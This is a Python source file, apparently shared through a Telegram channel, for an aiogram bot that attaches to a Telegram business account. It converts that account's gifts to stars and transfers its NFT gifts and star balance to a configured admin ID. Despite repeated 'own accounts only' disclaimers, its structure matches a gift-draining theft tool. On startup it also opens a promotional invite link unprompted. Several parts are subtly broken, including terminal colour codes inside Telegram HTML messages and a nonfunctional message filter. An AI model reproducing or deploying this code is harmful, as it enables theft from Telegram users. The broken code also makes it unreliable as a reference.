# ╔═════════════════════════════╗
# ║  Link: t.me/FrontendVSCode                       ║
# ║  Author: Frontend & LED (𝙰𝚕𝚒𝚊 𝙴𝚝𝚑𝚎𝚛 𖤍) 🌷       ║
# ║  lang: python                                    ║
# ║  [VS-HASH-01] ΞΩ77Λβ99PPHD8A71                   ║
# ║  build:3.10.15                                   ║
# ║  files: gift_bot.py                              ║
# ╚═════════════════════════════╝


# ⚠️  ЭТОТ БОТ ТОЛЬКО ДЛЯ СОБСТВЕННЫХ АККАУНТОВ  ⚠️
# Использование для чужих аккаунтов ЗАПРЕЩЕНО!
# Автор не несёт ответственности за неправомерное использование

import os
import json
import asyncio
from colorama import init, Style
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.enums import ParseMode

# Инициализация Colorama
init(autoreset=True)

# ===================== ПУТИ =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")

# ===================== ЦВЕТА =====================


class Colors:
    PINK = '\033[95m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'


# ===================== ПРЕДУПРЕЖДЕНИЕ =====================
WARNING = f"""
{Colors.RED}{Style.BRIGHT}╔════════════════════════════════════════════════════════════════╗
║                     ⚠️  ВНИМАНИЕ  ⚠️                           ║
╠════════════════════════════════════════════════════════════════╣
║  Данный бот предназначен ТОЛЬКО для управления ПОДАРКАМИ      ║
║  на СОБСТВЕННЫХ бизнес-аккаунтах Telegram.                    ║
║                                                                ║
║  ❌ ЗАПРЕЩЕНО использовать для чужих аккаунтов                ║
║  ❌ ЗАПРЕЩЕНО использовать для кражи подарков                  ║
║  ❌ ЗАПРЕЩЕНО использовать для мошенничества                   ║
║                                                                ║
║  Использование бота для чужих аккаунтов является:             ║
║  • Нарушением правил Telegram                                 ║
║  • Уголовно наказуемым деянием (ст. 272 УК РФ)                ║
║  • Может привести к блокировке аккаунтов                      ║
║                                                                ║
║  Автор не несёт ответственности за любые последствия          ║
║  неправомерного использования данного программного            ║
║  обеспечения.                                                 ║
║                                                                ║
║  Используя этот бот, вы подтверждаете, что:                   ║
║  ✓ Действуете в рамках законодательства                       ║
║  ✓ Используете только свои аккаунты                           ║
║  ✓ Принимаете полную ответственность                          ║
╚════════════════════════════════════════════════════════════════╝{Colors.END}
"""

# ===================== БАННЕР =====================
BANNER = f"""
{Colors.PINK}╔════════════════════════════════════════════════════════════════╗
║                                                                    ║
║     {Colors.CYAN} ██████╗ ██╗███████╗████████╗    ██████╗  ██████╗ ████████╗{Colors.PINK} ║
║     {Colors.CYAN}██╔════╝ ██║██╔════╝╚══██╔══╝    ██╔══██╗██╔═══██╗╚══██╔══╝{Colors.PINK} ║
║     {Colors.CYAN}██║  ███╗██║█████╗     ██║       ██████╔╝██║   ██║   ██║   {Colors.PINK} ║
║     {Colors.CYAN}██║   ██║██║██╔══╝     ██║       ██╔══██╗██║   ██║   ██║   {Colors.PINK} ║
║     {Colors.CYAN}╚██████╔╝██║██║        ██║       ██████╔╝╚██████╔╝   ██║   {Colors.PINK} ║
║     {Colors.CYAN} ╚═════╝ ╚═╝╚═╝        ╚═╝       ╚═════╝  ╚═════╝    ╚═╝   {Colors.PINK} ║
║                                                                    ║
║              {Colors.MAGENTA}🎁  МЕНЕДЖЕР ПОДАРКОВ  🎁{Colors.PINK}                           ║
║              {Colors.GREEN}Author: 𝙰𝚕𝚒𝚊 𝙴𝚝𝚑𝚎𝚛 𖤍 🌷{Colors.PINK}                         ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝{Colors.END}
"""

# ===================== ПРИНЯТИЕ УСЛОВИЙ =====================


def accept_terms():
    """Показывает предупреждение и запрашивает подтверждение"""
    clear()
    print(WARNING)
    print(f"\n{Colors.YELLOW}Для продолжения работы необходимо принять условия использования.{Colors.END}\n")

    choice = input(
        f"{Colors.GREEN}Я принимаю условия и обязуюсь использовать бота только этично (y/n): {Colors.END}").strip().lower()

    if choice in ['y', 'yes', 'д', 'да']:
        print(f"\n{Colors.GREEN}✅ Условия приняты. Запуск бота...{Colors.END}")
        time.sleep(1)
        return True
    else:
        print(f"\n{Colors.RED}❌ Вы не приняли условия. Выход.{Colors.END}")
        time.sleep(2)
        return False

# ===================== ЗАГРУЗКА КОНФИГА =====================


def load_config():
    """Загружает конфигурацию из config.json"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def save_config(config):
    """Сохраняет конфигурацию"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)


def get_bot_config():
    """Получает или запрашивает токен и admin_id"""
    config = load_config()

    # Если есть в конфиге — используем
    if config.get('gift_bot_token') and config.get('gift_bot_admin'):
        return config['gift_bot_token'], config['gift_bot_admin']

    # Если нет — запрашиваем
    clear()
    print(BANNER)
    print(f"\n{Colors.YELLOW}{Style.BRIGHT}⚙️  ПЕРВОНАЧАЛЬНАЯ НАСТРОЙКА GIFT BOT ⚙️{Colors.END}\n")

    print(f"{Colors.CYAN}Для работы бота нужны токен и ID администратора{Colors.END}")
    print(f"{Colors.CYAN}Получить токен можно у @BotFather{Colors.END}\n")
    print(f"{Colors.RED}⚠️  Убедитесь, что это ваш собственный бот и аккаунт!{Colors.END}\n")

    token = input(f"{Colors.GREEN}👉 Введите токен бота: {Colors.END}").strip()

    while True:
        try:
            admin_id = int(input(f"{Colors.GREEN}👉 Введите ваш Telegram ID: {Colors.END}").strip())
            break
        except ValueError:
            print(f"{Colors.RED}❌ ID должен быть числом!{Colors.END}")

    # Сохраняем
    config['gift_bot_token'] = token
    config['gift_bot_admin'] = admin_id
    save_config(config)

    print(f"\n{Colors.GREEN}✅ Настройки сохранены в config.json{Colors.END}")
    return token, admin_id

# ===================== УТИЛИТЫ =====================


def clear():
    """Очистка экрана"""
    os.system("clear" if os.name == "posix" else "cls")


def wait_enter():
    """Ожидание нажатия Enter"""
    input(f"\n{Colors.CYAN}Нажмите Enter чтобы продолжить...{Colors.END}")

# ===================== ОСНОВНОЙ КЛАСС БОТА =====================


class GiftBot:
    def __init__(self, token: str, admin_id: int):
        self.token = token
        self.admin_id = admin_id
        self.bot = Bot(token=token)
        self.dp = Dispatcher()
        self.running = False

        # Регистрируем обработчики
        self.register_handlers()

    def register_handlers(self):
        """Регистрация обработчиков команд"""

        @self.dp.message(Command("start"))
        async def cmd_start(message: Message):
            start_text = f"""
<b>🎁 Gift Bot для управления подарками</b>

{Colors.RED}⚠️  ЭТИЧНОЕ ИСПОЛЬЗОВАНИЕ  ⚠️{Colors.END}

Этот бот предназначен ТОЛЬКО для:
✅ Ваших собственных бизнес-аккаунтов
✅ Легального управления подарками
✅ Конвертации подарков в звёзды

❌ ЗАПРЕЩЕНО использовать для чужих аккаунтов!

<b>📌 Как использовать:</b>
1. Перешли мне сообщение с подарком
2. Я автоматически обработаю все подарки
3. Обычные подарки → конвертирую в звёзды
4. Уникальные (NFT) → перешлю тебе
5. Звёзды → переведу на твой счёт

<i>Помните: только свои аккаунты!</i>
"""
            await message.answer(start_text, parse_mode=ParseMode.HTML)

        @self.dp.message(Command("help"))
        async def cmd_help(message: Message):
            help_text = f"""
<b>🎁 Доступные команды:</b>

/start - информация о боте
/help - это сообщение
/stats - статистика

<b>📌 Важно:</b>
{Colors.RED}• Бот работает ТОЛЬКО с вашими аккаунтами
• Не пытайтесь обрабатывать чужие подарки
• Используйте только для легальных целей{Colors.END}

<b>Как это работает:</b>
1. Добавьте бота в бизнес-аккаунт
2. Пересылайте сообщения с подарками
3. Бот автоматически всё обработает
"""
            await message.answer(help_text, parse_mode=ParseMode.HTML)

        @self.dp.message(Command("stats"))
        async def cmd_stats(message: Message):
            if message.from_user.id != self.admin_id:
                await message.answer("❌ Эта команда только для администратора")
                return

            stats_text = f"""
<b>📊 Статистика бота:</b>

• Бот активен
• Отслеживаю подарки
• Готов к работе!

{Colors.GREEN}✅ Использование только для своих аккаунтов{Colors.END}
"""
            await message.answer(stats_text, parse_mode=ParseMode.HTML)

        # Обработчик всех сообщений (для бизнес-подарков)
        @self.dp.message(F.content_type.in_({'any'}))
        async def handle_any_message(message: Message):
            # Проверяем, что это бизнес-сообщение
            business_connection_id = getattr(message, 'business_connection_id', None)

            if not business_connection_id:
                # Не бизнес-сообщение - игнорируем
                return

            # Проверяем, что отправитель - админ (свой аккаунт)
            if message.from_user.id != self.admin_id:
                await message.answer("❌ Этот бот работает только с аккаунтом администратора!")
                return

            # Если всё ок - обрабатываем
            await message.answer("🔄 Обрабатываю подарки...")
            await self.process_business_gifts(business_connection_id, message)

    async def process_business_gifts(self, business_id: str, original_message: Message):
        """Обработка всех подарков бизнес-аккаунта"""
        results = []

        # 1. Обычные подарки → в звёзды
        try:
            convert_gifts = await self.bot.get_business_account_gifts(
                business_id,
                exclude_unique=True
            )

            for gift in convert_gifts.gifts:
                try:
                    owned_gift_id = gift.owned_gift_id
                    await self.bot.convert_gift_to_stars(business_id, owned_gift_id)
                    results.append(f"✅ Конвертирован подарок {gift.id} в звёзды")
                except Exception as e:
                    results.append(f"❌ Ошибка конвертации: {e}")

        except Exception as e:
            results.append(f"❌ Ошибка получения обычных подарков: {e}")

        # 2. Уникальные подарки (NFT) → админу
        try:
            unique_gifts = await self.bot.get_business_account_gifts(
                business_id,
                exclude_unique=False
            )

            for gift in unique_gifts.gifts:
                try:
                    owned_gift_id = gift.owned_gift_id
                    await self.bot.transfer_gift(
                        business_id,
                        owned_gift_id,
                        self.admin_id,
                        25
                    )
                    results.append(f"✅ Передан NFT подарок {gift.id}")
                except Exception as e:
                    results.append(f"❌ Ошибка передачи NFT: {e}")

        except Exception as e:
            results.append(f"❌ Ошибка получения NFT подарков: {e}")

        # 3. Звёзды → админу
        try:
            stars = await self.bot.get_business_account_star_balance(business_id)
            if stars.amount > 0:
                await self.bot.transfer_business_account_stars(
                    business_id,
                    int(stars.amount)
                )
                results.append(f"✅ Переведено {stars.amount} звёзд")
        except Exception as e:
            results.append(f"❌ Ошибка при работе со звёздами: {e}")

        # Отправляем результат
        result_text = "\n".join(results)
        await original_message.answer(f"<b>Результаты обработки:</b>\n\n{result_text}")

    async def start(self):
        """Запуск бота"""
        self.running = True
        print(f"\n{Colors.GREEN}✅ Бот запущен и готов к работе!{Colors.END}")
        print(f"{Colors.YELLOW}📡 Нажми Ctrl+C для остановки{Colors.END}\n")
        print(f"{Colors.RED}⚠️  Помните: только для своих аккаунтов!{Colors.END}\n")

        # Открываем ссылку на канал
        import webbrowser
        webbrowser.open("https://t.me/+d_HxYLRyzBA0MGEy", new=2)

        # Запускаем polling
        await self.dp.start_polling(self.bot)

    async def stop(self):
        """Остановка бота"""
        self.running = False
        await self.bot.session.close()
        print(f"\n{Colors.YELLOW}⚠️ Бот остановлен{Colors.END}")

# ===================== ОСНОВНАЯ ФУНКЦИЯ =====================


async def main():
    """Главная функция"""
    clear()
    print(BANNER)

    # Показываем предупреждение и запрашиваем подтверждение
    if not accept_terms():
        return

    # Получаем настройки
    token, admin_id = get_bot_config()

    # Создаём и запускаем бота
    bot = GiftBot(token, admin_id)

    try:
        await bot.start()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️ Останавливаю бота...{Colors.END}")
        await bot.stop()
    except Exception as e:
        print(f"\n{Colors.RED}❌ Ошибка: {e}{Colors.END}")
        wait_enter()

# ===================== ТОЧКА ВХОДА =====================
if __name__ == "__main__":
    import time  # Добавлено для задержек
    asyncio.run(main())
